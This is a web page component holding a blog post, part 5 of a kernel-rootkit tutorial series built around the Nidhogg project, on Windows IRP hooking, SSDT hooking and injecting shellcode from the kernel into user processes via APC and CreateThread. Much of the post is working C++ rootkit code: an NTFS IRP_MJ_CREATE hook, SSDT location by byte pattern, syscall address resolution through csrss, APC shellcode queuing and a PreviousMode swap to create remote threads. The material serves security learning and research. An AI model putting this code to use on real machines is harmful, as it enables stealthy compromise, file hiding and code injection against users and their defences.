"use client"

import React from "react";
import StyledLink from "@/components/StyledLink";
import SecondaryHeader, {BlogPrologue, BulletList, Code, InlineCode, ThirdHeader} from "@/components/BlogComponents";

export default function LordOfTheRing0P5() {
    let ntfsHookCode = `NTSTATUS FileUtils::InstallNtfsHook(int irpMjFunction) {
    UNICODE_STRING ntfsName;
    PDRIVER_OBJECT ntfsDriverObject = nullptr;
    NTSTATUS status = STATUS_SUCCESS;

    RtlInitUnicodeString(&ntfsName, L"\\\\FileSystem\\\\NTFS");
    status = ObReferenceObjectByName(&ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0, *IoDriverObjectType, KernelMode, NULL, (PVOID*)&ntfsDriverObject);

    if (!NT_SUCCESS(status))
        return status;

    switch (irpMjFunction) {
        case IRP_MJ_CREATE: {
            this->Callbacks[0].Address = (PVOID)InterlockedExchange64((LONG64*)&ntfsDriverObject->MajorFunction[IRP_MJ_CREATE], (LONG64)HookedNtfsIrpCreate);
            this->Callbacks[0].Activated = true;
            break;
        }
        default:
            status = STATUS_NOT_SUPPORTED;
    }

    ObDereferenceObject(ntfsDriverObject);
    return status;
}`;
    let getSSDTAddressCode = `NTSTATUS MemoryUtils::GetSSDTAddress() {
    ULONG infoSize = 0;
    PVOID ssdtRelativeLocation = NULL;
    PVOID ntoskrnlBase = NULL;
    PRTL_PROCESS_MODULES info = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    UCHAR pattern[] = "\\x4c\\x8d\\x15\\xcc\\xcc\\xcc\\xcc\\x4c\\x8d\\x1d\\xcc\\xcc\\xcc\\xcc\\xf7";

    // Getting ntoskrnl base first.
    status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);

    // ...

    PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;

    for (ULONG i = 0; i < info->NumberOfModules; i++) {
        if (NtCreateFile >= modules[i].ImageBase && NtCreateFile < (PVOID)((PUCHAR)modules[i].ImageBase + modules[i].ImageSize)) {
            ntoskrnlBase = modules[i].ImageBase;
            break;
        }
    }

    if (!ntoskrnlBase) {
        ExFreePoolWithTag(info, DRIVER_TAG);
        return STATUS_NOT_FOUND;
    }

    // ...

    PIMAGE_SECTION_HEADER firstSection = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);

    for (PIMAGE_SECTION_HEADER section = firstSection; section < firstSection + ntHeaders->FileHeader.NumberOfSections; section++) {
        if (strcmp((const char*)section->Name, ".text") == 0) {
            ssdtRelativeLocation = FindPattern(pattern, 0xCC, sizeof(pattern) - 1, (PUCHAR)ntoskrnlBase + section->VirtualAddress, section->Misc.VirtualSize, NULL, NULL);

            if (ssdtRelativeLocation) {
                status = STATUS_SUCCESS;
                this->ssdt = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)ssdtRelativeLocation + *(PULONG)((PUCHAR)ssdtRelativeLocation + 3) + 7);
                break;
            }
        }
    }

    ExFreePoolWithTag(info, DRIVER_TAG);
    return status;
}`
    let getSSDTFunctionAddressCode = `PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
    KAPC_STATE state;
    PEPROCESS CsrssProcess = NULL;
    PVOID functionAddress = NULL;
    ULONG index = 0;
    UCHAR syscall = 0;
    ULONG csrssPid = 0;
    NTSTATUS status = NidhoggProccessUtils->FindPidByName(L"csrss.exe", &csrssPid);

    if (!NT_SUCCESS(status))
        return functionAddress;

    status = PsLookupProcessByProcessId(ULongToHandle(csrssPid), &CsrssProcess);

    if (!NT_SUCCESS(status))
        return functionAddress;

    // Attaching to the process's stack to be able to walk the PEB.
    KeStackAttachProcess(CsrssProcess, &state);
    PVOID ntdllBase = GetModuleBase(CsrssProcess, L"\\\\Windows\\\\System32\\\\ntdll.dll");

    if (!ntdllBase) {
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(CsrssProcess);
        return functionAddress;
    }
    PVOID ntdllFunctionAddress = GetFunctionAddress(ntdllBase, functionName);

    if (!ntdllFunctionAddress) {
        KeUnstackDetachProcess(&state);
        ObDereferenceObject(CsrssProcess);
        return functionAddress;
    }

    // Searching for the syscall.
    while (((PUCHAR)ntdllFunctionAddress)[index] != RETURN_OPCODE) {
        if (((PUCHAR)ntdllFunctionAddress)[index] == MOV_EAX_OPCODE) {
            syscall = ((PUCHAR)ntdllFunctionAddress)[index + 1];
        }
        index++;
    }
    KeUnstackDetachProcess(&state);

    if (syscall != 0)
        functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);

    ObDereferenceObject(CsrssProcess);
    return functionAddress;
}`
    let injectShellcodeAPCCode = `NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
    // ...
    NTSTATUS status = STATUS_SUCCESS;
    SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;

    // ...

    // Find APC suitable thread.
    status = FindAlertableThread(pid, &TargetThread);

    do {
        // ...

        // Allocate and write the shellcode.
        InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        cid.UniqueProcess = pid;
        cid.UniqueThread = NULL;

        status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

        if (!NT_SUCCESS(status))
            break;

        status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

        if (!NT_SUCCESS(status))
            break;
        shellcodeSize = ShellcodeInfo->ShellcodeSize;

        status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);

        if (!NT_SUCCESS(status))
            break;

        // Create and execute the APCs.
        ShellcodeApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);
        PrepareApc = (PKAPC)AllocateMemory(sizeof(KAPC), false);

        if (!ShellcodeApc || !PrepareApc) {
            status = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
        KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);

        if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        if (!KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        if (PsIsThreadTerminating(TargetThread))
            status = STATUS_THREAD_IS_TERMINATING;

    } while (false);


    // ...

    return status;
}`
    let injectShellcodeThreadCode = `NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
    // ...
    SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;
    HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
    NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);

    // ...

    status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

    do {
        if (!NT_SUCCESS(status))
            break;

        status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

        if (!NT_SUCCESS(status))
            break;

        shellcodeSize = ShellcodeInfo->ShellcodeSize;
        status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);

        if (!NT_SUCCESS(status))
            break;

        // Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
        InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
        CHAR tmpPreviousMode = *previousMode;
        *previousMode = KernelMode;
        status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
        *previousMode = tmpPreviousMode;

    } while (false);

    // ...

    return status;
}`

    return (
        <div className="bg-bgInsideDiv p-6 rounded-xl h-full">
            <BlogPrologue title="Lord Of The Ring0 - Part 5 | Saruman's Manipulation"
                          date="19.07.2023" projectLink="https://github.com/Idov31/Nidhogg"/>
            <div className="pt-4">
                <article>
                    <SecondaryHeader text="Prologue"/>
                    <div className="drop-caps pt-4">
                        In the <StyledLink href="/posts/lord-of-the-ring0-p4" content="last blog post"
                                           textSize="text-md"/>, we learned about the different types of kernel
                        callbacks and created our registry protector driver.

                        <div className="pt-2">
                            In this blog post, I&apos;ll explain two common hooking methods (IRP Hooking and SSDT Hooking)
                            and two different injection techniques from the kernel to the user mode for both shellcode
                            and DLL (APC and CreateThread) with code snippets and examples from Nidhogg.
                        </div>
                    </div>
                    <SecondaryHeader text="IRP Hooking"/>
                    <div className="pt-4">
                        <i>Side note: This topic (and more) was also covered in my talk
                            <StyledLink href="https://www.youtube.com/watch?v=CVJmGfElqw0"
                                        content=' "(Lady)Lord Of The Ring0"' textSize="text-md"/> -
                            feel free to check that out!</i>
                    </div>
                    <ThirdHeader text="IRP Reminder"/>

                    <div className="pt-4">
                        This is a quick reminder from the
                        <StyledLink href="https://idov31.github.io/2022/08/04/lord-of-the-ring0-p2.html"
                                    content=" 2nd part" textSize="text-md"/>,
                        if you remember what IRP is you can skip to the <StyledLink href="#implementing-irp-hooking"
                                                                                    content="next section"
                                                                                    textSize="text-md"/>.
                        <div>
                            &quot;An I/O request packet (IRP) is the basic I/O manager structure used to communicate with
                            drivers
                            and to allow drivers to communicate with each other. A packet consists of two different
                            parts:

                            <BulletList items={[
                                {
                                    content: "Header, or fixed part of the packet — This is used by the I/O manager to store information about the original request."
                                },
                                {
                                    content: 'I/O stack locations — Stack location contains the parameters, function codes, and context used by the corresponding driver to determine what it is supposed to be doing." - ',
                                    linkContent: "Microsoft Docs",
                                    link: "https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp"
                                }
                            ]}/>
                        </div>
                        <div className="pt-2">
                            In simple words, IRP allows kernel developers to communicate either from user mode to kernel
                            mode or from one kernel driver to another. Each time a certain IRP is sent, the
                            corresponding
                            function in the dispatch table is executed. The dispatch table (or <InlineCode
                            text="MajorFunction"/>) is a member inside the <InlineCode text="DRIVER_OBJECT"/> that
                            contains the mapping between the IRP and the function that should handle the IRP.
                            <div className="pt-2">
                                The general signature for a function that handles IRP is:
                            </div>
                            <Code text="NTSTATUS IrpHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp);"/>
                            To handle an IRP, the developer needs to add their function to the MajorFunction table as
                            follows:
                            <Code text="DriverObject->MajorFunction[IRP_CODE] = IrpHandler;"/>
                            Several notable IRPs (some of them we used previously in this series) are:

                            <BulletList items={[
                                {
                                    content: "IRP_MJ_DEVICE_CONTROL - Used to handle communication with the driver."
                                },
                                {
                                    content: "IRP_MJ_CREATE - Used to handle Zw/NtOpenFile calls to the driver.",
                                },
                                {
                                    content: "IRP_MJ_CLOSE - Used to handle (among other things) Zw/NtClose calls to the driver.",
                                },
                                {
                                    content: "IRP_MJ_READ - Used to handle Zw/NtReadFile calls to the driver.",
                                },
                                {
                                    content: "IRP_MJ_WRITE - Used to handle Zw/NtWriteFile calls to the driver.",
                                }
                            ]}/>
                        </div>
                    </div>

                    <ThirdHeader text="Implementing IRP Hooking"/>
                    <div className="pt-4">
                        <div>
                            IRP hooking is very similar to <StyledLink
                            href="https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking"
                            content="IAT hooking" textSize="text-md"/> in a way, as both of them are about replacing a
                            function in a table and deciding whether to call the original function or not (usually, the
                            original function will be called).
                        </div>
                        <div className="pt-2">
                            In IRP hooking the malicious driver replaces an IRP handler of another driver with their
                            handler. A common example is to hook the <InlineCode text="IRP_MJ_CREATE"/> handler of the
                            NTFS driver to prevent file opening.
                        </div>
                        <div className="pt-2">
                            As an example, I will show the NTFS <InlineCode text="IRP_MJ_CREATE"/> hook <StyledLink
                            href="https://github.com/Idov31/Nidhogg/blob/master/Nidhogg/FileUtils.cpp#L86"
                            content="from Nidhogg" textSize="text-md"/>:
                            <Code text={ntfsHookCode}/>
                            The first thing that is needed to be done when doing an IRP hooking is to obtain the
                            <InlineCode text=" DriverObject"/> because it stores the MajorFunction table (as
                            mentioned <StyledLink
                            href="#irp-reminder" content="before" textSize="text-md"/>), this can be done with the
                            <InlineCode text=" ObReferenceObjectByName"/> and the symbolic link to NTFS.
                        </div>
                        <div className="pt-2">
                            When the DriverObject is achieved, it is just a matter of overwriting the original value of
                            <InlineCode text=" IRP_MJ_CREATE"/> with <InlineCode
                            text="InterlockedExchange64"/> (<b>NOTE: <InlineCode text="InterlockedExchange64"/> was used
                            and not simply overwriting to make sure the function is not currently in used to prevent
                            potential BSOD and other problems</b>).
                        </div>
                    </div>
                    <ThirdHeader text="Hooking IRPs in 2023"/>
                    <div className="pt-4">
                        <div>
                            Although this is a nice method, there is one major problem that holding kernel developers
                            from using this method - Kernel Patch Protection (PatchGuard). As you can see <StyledLink
                            href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x109---critical-structure-corruption"
                            content="here " textSize="text-md"/>
                            when PatchGuard detects that the IRP function is changed, it triggers a BSOD
                            with <InlineCode text="CRITICAL_STRUCTURE_CORRUPTION"/> error code.
                        </div>
                        <div className="pt-2">
                            While bypassing this is possible with projects like <StyledLink
                            href="https://github.com/not-wlan/driver-hijack"
                            content="this one" textSize="text-md"/> it is beyond the scope of this series.
                        </div>
                    </div>
                    <SecondaryHeader text="SSDT Hooking"/>
                    <ThirdHeader text="What is SSDT"/>
                    <div className="pt-4">
                        SSDT (System Service Descriptor Table) is an array that contains the mapping between the
                        <StyledLink href="https://en.wikipedia.org/wiki/System_call" content=" syscall"
                                    textSize="text-md"/> and the corresponding function in the
                        kernel. The SSDT is accessible via <InlineCode text="nt!KiServiceTable"/> command in WinDBG or
                        can be located dynamically
                        via pattern searching.
                        <div className="pt-2">
                            The syscall number is the index to the relative offset of the function and is calculated as
                            follows:
                            <Code text="functionAddress = KiServiceTable + (KiServiceTable[syscallIndex] >> 4)"/>
                        </div>
                    </div>
                    <ThirdHeader text="Implementing SSDT Hooking"/>
                    <div className="pt-4">
                        SSDT hooking is when a malicious program changes the mapping of a certain syscall to point to
                        its function. For example, an attacker can modify the <InlineCode text="NtCreateFile"/> address
                        in the SSDT to point to their own malicious <InlineCode text="NtCreateFile"/>. To do that,
                        several steps need to be made:

                        <BulletList items={[
                            {
                                content: "Find the address of SSDT."
                            },
                            {
                                content: "Find the address of the wanted function in the SSDT by its syscall."
                            },
                            {
                                content: "Change the entry in the SSDT to point to the malicious function."
                            }
                        ]}/>

                        To find the address of SSDT by pattern I will use the code below (the code has been modified a
                        bit for readability, you can view the unmodified version <StyledLink
                        href="https://github.com/Idov31/Nidhogg/blob/master/Nidhogg/MemoryUtils.cpp#L1330"
                        content="here" textSize="text-md"/>:
                        <Code text={getSSDTAddressCode}/>
                        The code above is finding <InlineCode text="ntoskrnl"/> base based on the location
                        of <InlineCode text="NtCreateFile"/>. After the base of <InlineCode text="ntoskrnl"/> was
                        achieved all is left to do is to find the pattern within the <InlineCode text=".text"/> section
                        of it. The pattern gives the relative location of the SSDT and with a simple calculation
                        based on the relative offset the location of the SSDT is achieved.

                        <div className="pt-2">
                            To find a function, all there needs to be done is to find the syscall of the desired
                            function (alternatively a hardcoded <InlineCode text="syscall "/>
                            can be used as well but it is bad practice for forward compatibility) and then access the
                            right location in the SSDT (as mentioned <StyledLink href="#what-is-ssdt" content="here"
                                                                                 textSize="text-md"/>).
                            <Code text={getSSDTFunctionAddressCode}/>
                            The code above is finding <InlineCode text="csrss"/> (a process that will always run and has
                            <InlineCode text=" ntdll"/>) loaded and finding the location of the function
                            inside <InlineCode text="ntdll"/>. After it finds the location of the function
                            inside <InlineCode text="ntdll"/>, it searches for the last <InlineCode
                            text="mov eax, [variable]"/> pattern to make sure it finds the syscall number.

                            <div className="pt-2">
                                When the syscall number is known, all there is needs to be done is to find the function
                                address with the SSDT.
                            </div>
                        </div>
                    </div>
                    <ThirdHeader text="Hooking SSDT in 2023"/>
                    <div className="pt-4">
                        This method was abused heavily by rootkit developers and Antimalware developers alike in the
                        golden area of rootkits. The reason this method is no longer used is because PatchGuard monitors
                        SSDT changes and crashes the machine if a modification is detected.
                        <div>
                            While this method cannot be used in modern systems without tampering with PatchGuard,
                            throughout the years developers found other ways to hook <InlineCode text="syscalls"/> as
                            substitution.
                        </div>
                    </div>
                    <SecondaryHeader text="APC Injection"/>
                    <div className="pt-4">
                        Explaining how APCs work is beyond the scope of this series, which is why I recommend reading
                        <StyledLink href="https://twitter.com/0xrepnz" content=" Repnz's"
                                    textSize="text-md"/> series <StyledLink
                        href="https://repnz.github.io/posts/apc/kernel-user-apc-api/" content="about APCs"
                        textSize="text-md"/>.

                        <div className="pt-2">
                            To inject a shellcode into a user mode process with an APC several conditions need to be
                            met:
                            <BulletList items={[
                                {
                                    content: "The thread should be alertable."
                                },
                                {
                                    content: "The shellcode should be accessible from the user mode."
                                }
                            ]}/>
                            (the full implementation is <StyledLink
                            href="https://github.com/Idov31/Nidhogg/blob/master/Nidhogg/MemoryUtils.cpp#L210"
                            content="here"
                            textSize="text-md"/>).
                            <Code text={injectShellcodeAPCCode}/>
                            The code above opens a target process, search for a thread that can be alerted (can be done
                            by examining the <StyledLink
                            href="https://www.vergiliusproject.com/kernels/x64/Windows%2011/22H2%20(2022%20Update)/_KTHREAD"
                            content="thread's MiscFlags"
                            textSize="text-md"/>
                            <InlineCode text=" Alertable"/> bit and the thread&apos;s <InlineCode text="ThreadFlags"/>&apos;s GUI
                            bit, if a thread is alertable and isn&apos;t GUI related it is suitable).
                            <div className="pt-2">
                                If the thread is suitable, two APCs are initialized, one for alerting the thread and
                                another one to clean up the memory and execute the shellcode.
                            </div>
                            <div className="pt-2">
                                After the APCs are initialized, they are queued - first, the APC that will clean up the
                                memory and execute the shellcode and later the APC that is alerting the thread to
                                execute the shellcode.
                            </div>
                        </div>
                    </div>
                    <SecondaryHeader text="CreateThread Injection"/>
                    <div className="pt-4">
                        Injecting a thread into a user mode process from the kernel is similar to injecting from a user
                        mode with the main difference being that there are sufficient privileges to create another
                        thread inside that process.
                        <div>
                            That can be achieved easily by changing the calling thread&apos;s
                            previous mode to <InlineCode text="KernelMode"/> and restoring it once the thread has been
                            created. (the full implementation is
                            <StyledLink
                                href="https://github.com/Idov31/Nidhogg/blob/master/Nidhogg/MemoryUtils.cpp#L318"
                                content=" here"
                                textSize="text-md"/>)
                        </div>
                        <Code text={injectShellcodeThreadCode}/>
                        Unlike the APC injection, the steps here are simple: After the process has been opened and the
                        shellcode was allocated and written to the target process, changing the current thread&apos;s mode to
                        <InlineCode text=" KernelMode"/> and calling <InlineCode text="NtCreateThreadEx"/> to create a
                        thread inside the target process and restoring it to the original previous mode right after.
                    </div>
                    <SecondaryHeader text="Conculsion"/>
                    <div className="pt-4">
                        In this blog, we learned about the different types of kernel callbacks and created our registry
                        protector driver.
                        <div className="pt-2">
                            In the next blog, we will learn how to patch user mode memory from the kernel and write a
                            simple
                            driver that can perform AMSI bypass to demonstrate, how to hide ports and how to dump
                            credentials from the kernel.
                        </div>
                        <div className="pt-2">
                            I hope that you enjoyed the blog and I&apos;m available on <StyledLink
                            href="https://twitter.com/Idov31" content="X (Twitter)" textSize="text-md"/>, <StyledLink
                            href="https://t.me/idov31" content="Telegram" textSize="text-md"/> and by <StyledLink
                            href="mailto:idov3110@gmail.com" content="mail" textSize="text-md"/> to hear what you think
                            about it!
                        </div>

                        <div className="pt-2">
                            This blog series is following my learning curve of kernel mode development and if you
                            like
                            this blog post you can check out Nidhogg on <StyledLink
                            href="https://github.com/idov31/Nidhogg" content="Github" textSize="text-md"/>.
                        </div>
                    </div>
                </article>
            </div>
        </div>
    );
}
